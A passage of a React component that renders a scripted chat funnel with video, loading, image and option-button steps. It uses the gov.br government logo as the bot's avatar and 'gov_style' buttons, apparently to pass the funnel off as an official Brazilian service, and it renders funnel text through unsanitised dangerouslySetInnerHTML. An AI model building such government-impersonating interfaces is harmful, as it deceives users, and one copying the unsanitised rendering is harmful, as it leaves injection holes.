    const nextStep = funnelDefinition.steps[currentStepKey]?.nextStep;
    if (nextStep) {
        if (autoTransitionTimerRef.current) clearTimeout(autoTransitionTimerRef.current); // Clear pending auto-transitions
        setCurrentStepKey(nextStep);
    }
  };

  // Helper to get icon component based on name
  const getIconComponent = (iconName?: string) => {
    if (!iconName) return null;
    // Simple mapping, can be expanded
    if (iconName.includes('success_checkmark')) return <CheckCircle size={20} style={{ color: 'green', marginRight: '8px', verticalAlign: 'bottom', flexShrink: 0 }} />;
    if (iconName.includes('warning_amber')) return <AlertTriangle size={20} style={{ color: 'orange', marginRight: '8px', verticalAlign: 'bottom', flexShrink: 0 }} />;
    if (iconName.includes('currency_dollar')) return <span style={{fontSize: '20px', marginRight: '8px', verticalAlign: 'bottom', flexShrink: 0}}>💰</span>; // Emoji as placeholder
    return null;
  }


  return (
    <div className="simulated-chat-container" style={{ height: '100%', overflowY: 'auto', display: 'flex', flexDirection: 'column', padding: '10px', backgroundColor: '#f0f0f0' }}>
      <audio ref={audioRef} style={{ display: 'none' }} />

      {/* Video Placeholder Section */}
      {videoStepData && ( // Only render if videoStepData is set (i.e., current step is videoDisplay)
        <div className="intro-video-section" style={{ marginBottom: '15px', padding: '10px', background: '#fff', borderRadius: '8px', boxShadow: '0 2px 10px rgba(0,0,0,0.1)' }}>
          {currentVideoMessage && <p className="bot-message" style={{ background: '#f1f1f1', boxShadow: 'none', paddingLeft: 0, marginBottom: '10px', whiteSpace: 'pre-line' }}>{currentVideoMessage}</p>}
          <div
            onClick={handleVideoThumbnailClick}
            className="video-placeholder-wrapper"
            style={{
              position: 'relative', width: '100%', aspectRatio: '16/9',
              margin: '0 auto', borderRadius: '8px', overflow: 'hidden',
              backgroundColor: '#333', cursor: 'pointer'
            }}
          >
            {showVideoThumbnailOverlay && ( // Show overlay if state is true
              <div
                style={{
                  position: 'absolute', top: 0, left: 0, right: 0, bottom: 0,
                  background: 'rgba(0,0,0,0.6)', display: 'flex', flexDirection: 'column',
                  justifyContent: 'center', alignItems: 'center', color: 'white', zIndex: 10
                }}
              >
                <VolumeX size={48} />
                <span style={{ marginTop: '10px', fontSize: '18px', textAlign: 'center' }}>
                  {(videoStepData as FlowStepDataVideo)?.thumbnailText || "Clique para Ouvir"}
                </span>
              </div>
            )}
             <div style={{display: 'flex', justifyContent: 'center', alignItems: 'center', height: '100%', color: '#777'}}>
                {/* Placeholder text for when video would be playing */}
                { !showVideoThumbnailOverlay && <span style={{color: 'white'}}>Vídeo Iniciado (Simulado)</span> }
             </div>
          </div>
        </div>
      )}


      {/* Loading Screen Section */}
      {isLoadingStep && loadingMessage && ( // Only render if isLoadingStep is true
        <div className="loading-step-container" style={{ textAlign: 'center', padding: '20px', background: '#fff', borderRadius: '8px', margin: '10px 0', boxShadow: '0 2px 10px rgba(0,0,0,0.1)'}}>
          <Loader2 className="animate-spin" size={32} style={{ margin: '0 auto 10px auto', color: '#1451b4' }} />
          <p style={{ fontSize: '16px', color: '#333', whiteSpace: 'pre-line' }}>{loadingMessage}</p>
        </div>
      )}

      {/* Display Image Section */}
      {currentImageDetails && !isLoadingStep && ( // Only render if currentImageDetails is set and not loading
        <div className="image-step-container" style={{ padding: '15px', background: '#fff', borderRadius: '8px', margin: '10px 0', boxShadow: '0 2px 10px rgba(0,0,0,0.1)' }}>
          {currentImageDetails.message && <p className="bot-message" style={{ background: '#f1f1f1', boxShadow: 'none', paddingLeft:0, marginBottom: '10px', whiteSpace: 'pre-line' }} dangerouslySetInnerHTML={{__html: currentImageDetails.message}}/>}
          <Image src={currentImageDetails.url} alt={currentImageDetails.alt} width={300} height={400} style={{ display:'block', maxWidth: '100%', height: 'auto', borderRadius: '4px', border: '1px solid #eee', margin: '0 auto' }} data-ai-hint={currentImageDetails.aiHint || "document image"}/>
        </div>
      )}
      
      {/* Display Formatted Message Section */}
      {currentDisplayMessage && !isLoadingStep && ( // Only render if currentDisplayMessage is set and not loading
        <div className={`message-container bot-message-container display-message-block`} style={{alignSelf: 'flex-start', maxWidth: '90%', width: '100%'}}>
           <Image src="https://sso.acesso.gov.br/assets/govbr/img/govbr.png" alt="Bot Avatar" className="bot-avatar" width={32} height={32} data-ai-hint="government logo"/>
           <div className="message bot-message" style={{width: 'calc(100% - 40px)'}}> {/* Ensure message bubble takes available width */}
              {currentDisplayMessage.displayTitle && <h3 style={{ fontWeight: 'bold', marginBottom: '8px', fontSize: '17px', color: '#0056b3', display: 'flex', alignItems: 'center' }}>
                {getIconComponent(currentDisplayMessage.displayIcon)}
                <span dangerouslySetInnerHTML={{ __html: currentDisplayMessage.displayTitle }} />
              </h3>}
              {currentDisplayMessage.text && <p style={{ marginBottom: currentDisplayMessage.displayDetails ? '12px' : '0', whiteSpace: 'pre-line' }} dangerouslySetInnerHTML={{__html: currentDisplayMessage.text}} />}
              {currentDisplayMessage.displayDetails && (
                <div className="details-grid" style={{ borderTop: '1px solid #e0e0e0', paddingTop: '10px', display: 'grid', gridTemplateColumns: 'auto 1fr', gap: '6px 12px', fontSize: '14px' }}>
                  {Object.entries(currentDisplayMessage.displayDetails).map(([key, value]) => (
                    <React.Fragment key={key}>
                      <span style={{ fontWeight: '500', color: '#555' }} dangerouslySetInnerHTML={{__html: key}}/>
                      <span style={{ color: '#333' }} dangerouslySetInnerHTML={{__html: value}}/>
                    </React.Fragment>
                  ))}
                </div>
              )}
               {/* Display note if available in the original step data for displayMessage */}
               { (currentDisplayMessage.displayIcon && (funnelDefinition.steps[currentStepKey]?.data as FlowStepDataDisplayMessage)?.note) && (
                <p style={{fontSize: '12px', color: '#666', marginTop: '10px', borderTop: '1px dashed #ddd', paddingTop: '8px'}}>
                    <strong>Nota:</strong> {formatText((funnelDefinition.steps[currentStepKey]?.data as FlowStepDataDisplayMessage)?.note)}
                </p>
              )}
           </div>
        </div>
      )}

      {/* Regular Chat Messages */}
      {messages.map((msg) => (
          <div key={msg.id} className={`message-container ${msg.sender === 'bot' ? 'bot-message-container' : 'user-message-container'}`}>
            {msg.sender === 'bot' && (
              // Ensure Image component has width and height for bot avatar
              <Image src="https://sso.acesso.gov.br/assets/govbr/img/govbr.png" alt="Bot Avatar" className="bot-avatar" width={32} height={32} data-ai-hint="government logo"/>
            )}
            <div className={`message ${msg.sender === 'bot' ? 'bot-message' : 'user-message'}`}>
              {msg.text && <span style={{whiteSpace: 'pre-line'}} dangerouslySetInnerHTML={{__html: msg.text}} />}
              {/* Render options if they exist, bot is not typing, and text input is not active */}
              {msg.sender === 'bot' && msg.options && !isBotTyping && !isTextInputActive && (
                <div className="options-container">
                  {msg.options.map(opt => (
                    <button
                      key={opt.text} // Using text as key, consider more unique IDs if text can repeat
                      onClick={() => handleOptionClick(opt)}
                      className={`chat-option-button ${opt.style || ''}`} // Apply dynamic styles
                       dangerouslySetInnerHTML={{__html: opt.text}}
                    />
                  ))}
                </div>
              )}
            </div>
          </div>
        )
      )}

      {/* Text Input Form */}
      {isTextInputActive && currentTextInputConfig && !isBotTyping && (
        <form onSubmit={handleTextInputFormSubmit} className="chat-input-form-container" style={{ display: 'flex', marginTop: '10px', padding: '5px', background: '#fff', borderRadius: '8px', boxShadow: '0 2px 10px rgba(0,0,0,0.1)' }}>
          <input
            type="text"
            value={textInputValue}
            onChange={(e) => setTextInputValue(e.target.value)}
            placeholder={formatText(currentTextInputConfig.placeholder)}
            className="chat-text-input"
            style={{ flexGrow: 1, border: '1px solid #ccc', borderRadius: '15px', padding: '10px 15px', marginRight: '8px', fontSize: '15px' }}
            autoFocus
          />
          <button type="submit" className="chat-send-button" style={{ background: '#1451b4', color: 'white', border: 'none', borderRadius: '50%', width: '40px', height: '40px', display: 'flex', alignItems: 'center', justifyContent: 'center', cursor: 'pointer' }}>
            <Send size={20} />
          </button>
        </form>
      )}

      {/* Bot Typing Indicator */}
      {isBotTyping && !isLoadingStep && !videoStepData && !currentDisplayMessage && !currentImageDetails && !isTextInputActive && ( // Show only if no other special UI is active
         <div className="message-container bot-message-container">
            <Image src="https://sso.acesso.gov.br/assets/govbr/img/govbr.png" alt="Bot Avatar" className="bot-avatar" width={32} height={32} data-ai-hint="government logo"/>
            <div className="message bot-message typing-indicator">
                <span className="dot"></span><span className="dot"></span><span className="dot"></span>
            </div>
        </div>
      )}
      <div ref={chatEndRef} />
      <style jsx>{`
        .message-container { display: flex; margin-bottom: 12px; max-width: 90%; }
        .bot-message-container { align-self: flex-start; }
        .user-message-container { align-self: flex-end; flex-direction: row-reverse; }
        .bot-avatar { width: 32px; height: 32px; border-radius: 50%; margin-right: 8px; margin-top: 4px; align-self: flex-start; object-fit: cover; }
        .message { padding: 10px 15px; border-radius: 18px; line-height: 1.4; font-size: 15px; word-wrap: break-word; box-shadow: 0 1px 2px rgba(0,0,0,0.1); }
        .bot-message { background-color: #e9ecef; /* Light grey for bot messages */ color: #333; border-radius: 12px; }
        .user-message { background-color: #1451b4; /* Blue for user messages */ color: white; border-radius: 12px; margin-right: 0; }
        .user-message-container .user-message { margin-left: auto; }
        
        .options-container { 
          margin-top: 10px; 
          display: flex; 
          flex-direction: column; /* Stack options vertically */
          align-items: flex-start; /* Align options to the left */
          gap: 8px; 
          /* width: 100%; Options container takes full width relative to message bubble */
          /* padding-left: 40px; Removed padding-left for closer alignment under message */
        }
        .chat-option-button {
          background-color: #007bff; /* Brighter blue for user options */
          color: white;
          border: none;
          padding: 10px 20px; 
          border-radius: 25px; /* Pill shape */
          cursor: pointer; 
          font-size: 15px;
          font-weight: 500;
          transition: background-color 0.2s;
          text-align: center;
          box-shadow: 0 2px 4px rgba(0,0,0,0.1);
          /* width: auto; display: inline-block - flex properties on container will handle sizing */
        }
        .chat-option-button:hover { background-color: #0056b3; /* Darker blue on hover */ }

        /* Specific styles for CTA buttons from funnelDefinition */
        .chat-option-button.primary_cta_button_gov_style { background-color: #16a34a; /* Green */ border-color: #16a34a; color: white; font-weight: bold;}
        .chat-option-button.primary_cta_button_gov_style:hover { background-color: #15803d; border-color: #15803d; color: white; }
        
        .chat-option-button.secondary_link_button_gov_style { background-color: transparent; border: none; color: #007bff; /* Blue link */ text-decoration: underline; padding: 4px 0; box-shadow: none; font-size: 14px;}
        .chat-option-button.secondary_link_button_gov_style:hover { color: #0056b3; background-color: transparent; }

        .chat-option-button.destructive_link_button_gov_style { background-color: transparent; border: none; color: #dc3545; /* Red link */ text-decoration: underline; padding: 4px 0; box-shadow: none; font-size: 14px;}
        .chat-option-button.destructive_link_button_gov_style:hover { color: #c82333; background-color: transparent; }
        
        .typing-indicator { display: inline-flex; align-items: center; padding: 10px 15px; }
        .typing-indicator .dot { width: 8px; height: 8px; margin: 0 2px; background-color: #aaa; border-radius: 50%; animation: bounce 1.4s infinite; }
        .typing-indicator .dot:nth-child(2) { animation-delay: 0.2s; }
        .typing-indicator .dot:nth-child(3) { animation-delay: 0.4s; }
        @keyframes bounce { 0%, 80%, 100% { transform: scale(0); } 40% { transform: scale(1); } }
        /* Ensure displayMessage block takes full width for its content */
        .display-message-block .bot-message { width: auto; max-width: 100%; }
      `}</style>
    </div>
  );
};

export default SimulatedChatFlow;

    